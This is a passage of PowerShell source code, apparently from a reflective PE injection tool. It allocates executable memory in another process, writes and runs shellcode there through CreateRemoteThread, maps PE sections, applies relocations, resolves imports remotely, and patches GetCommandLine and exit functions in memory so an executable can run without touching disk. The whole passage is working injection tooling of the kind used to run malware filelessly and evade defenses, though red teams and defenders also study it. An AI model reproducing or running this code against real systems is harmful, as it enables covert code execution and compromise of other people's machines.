		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
					}
					else
					{
				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
